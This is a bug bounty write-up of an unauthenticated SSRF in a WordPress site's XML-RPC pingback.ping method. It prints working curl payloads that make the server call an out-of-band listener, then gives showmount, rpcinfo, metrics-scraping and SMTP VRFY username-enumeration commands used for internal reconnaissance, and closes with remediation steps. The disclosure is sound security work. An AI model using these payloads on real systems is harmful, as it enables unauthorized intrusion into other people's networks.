# SSRF-via-XML-RPC-Pingback-Internal-Network-Exposure

**Target Type:** E-commerce Platform (Bug Bounty)  
**Vulnerability Type:** Server-Side Request Forgery (SSRF) via XML-RPC  
**Authentication Required:** None (unauthenticated)  
**Severity:** Critical  
**Status:** Accepted and rewarded  
**Researcher:** Mustafa Salha  

---

## Summary

I identified a Server-Side Request Forgery vulnerability on a live bug bounty target through the WordPress XML-RPC interface. By abusing the `pingback.ping` method, I was able to make the server issue outbound HTTP requests to arbitrary destinations, with no authentication required.

What started as a basic SSRF quickly turned into full internal network reconnaissance. The server's internal infrastructure was exposed, including Kubernetes pod identifiers, NFS mount paths, RPC services, and an SMTP server, all reachable from the outside world through this single entry point.

---

## Attack Chain

### 1 - Identify XML-RPC and enumerate available methods

First confirmed XML-RPC was enabled and listed all supported methods:

```bash
curl -sk https://TARGET/blog/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>'
```
![Uploading Curl for Pingback.png…]()

`pingback.ping` was available - the method WordPress uses to notify other sites of links. This is the SSRF entry point.

---

### 2 - Trigger OOB callback via pingback

Sent a pingback request pointing to my OOB listener:

```bash
curl -sk https://TARGET/blog/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://<OOB-LISTENER>/ssrf-test</string></value></param>
    <param><value><string>https://TARGET/blog/sample-post/</string></value></param>
  </params>
</methodCall>'
```

DNS and HTTP callbacks received on the OOB listener - SSRF confirmed. The server's outbound IP was now known.

---

### 3 - Internal network recon via the server's outbound IP

Using the server IP obtained from the OOB callback, I queried internal services directly:

**Pulled Prometheus metrics, exposed Kubernetes pod IDs and NFS mount paths:**
```bash
curl -sk http://<INTERNAL-IP>:9100/metrics | grep "nfs\|sceptre\|storage" | head -20
```

**Extracted Kubernetes pod UUIDs:**
```bash
curl -sk http://<INTERNAL-IP>:9100/metrics | grep "sceptre-repo-storage" | grep -oP 'pods/\K[a-z0-9-]+' | sort -u
```

**Enumerated NFS export paths:**
```bash
showmount -e <INTERNAL-IP>
```

Result: `/mnt/storage *` - exported to everyone with no restriction.

**Queried RPC services:**
```bash
rpcinfo -p <INTERNAL-IP>
```

Exposed: `portmapper`, `mountd`, `nfs`, `nfs_acl`, `nlockmgr`, full NFS stack accessible.

---

### 4 - SMTP server exposed - internal user enumeration

Port scan on the server IP revealed SSH (22), SMTP (25), and HTTP (80/443) all open. The SMTP server had `VRFY` enabled, allowing username enumeration:

```bash
smtp-user-enum -M VRFY \
  -U /usr/share/seclists/Usernames/Names/names.txt \
  -t <INTERNAL-IP> -p 25
```

Valid internal usernames returned - confirming access to internal mail infrastructure.

---

### 5 - Pingback confirmed from internal server

The internal server at `192.110.X.X  ` made a direct HTTP pingback to my listener, confirming the server was actively reaching out - not just resolving DNS. Full HTTP headers received including `X-Pingback-Forwarded-For` showing the internal IP.

---

## Impact

This chain goes well beyond a basic SSRF:

- **Unauthenticated** - no credentials or account needed
- **Internal Kubernetes infrastructure exposed** - pod IDs, NFS storage paths, mount points
- **NFS share open to the world** - `/mnt/storage` exported with no access control
- **Internal users enumerable** via exposed SMTP VRFY
- **AWS server exposed** - SSH, SMTP, and HTTP open on a cloud instance tied to the target
- **Full internal IP range reachable** from the outside via server-side requests

---

## Timeline

| Date | Event |
|------|-------|
| 2026-05-08 | Vulnerability discovered and PoC developed |
| 2026-05-08 | Reported to the program |
| 2026-05-11 | Report accepted and rewarded |

---

## Remediation

- Disable XML-RPC entirely if not needed (`xmlrpc.php` should return 403)
- If XML-RPC is required, disable the `pingback.ping` method specifically
- Block outbound server-side HTTP requests to internal IP ranges
- Restrict Prometheus metrics endpoint (`/metrics`) to internal access only
- Lock down NFS exports - never export to `*`
- Disable SMTP `VRFY` command on all mail servers

---

## Researcher

**Mustafa Salha**  
Penetration Tester | Abu Dhabi, UAE  
GitHub: [MustafaSalhaa](https://github.com/MustafaSalhaa)
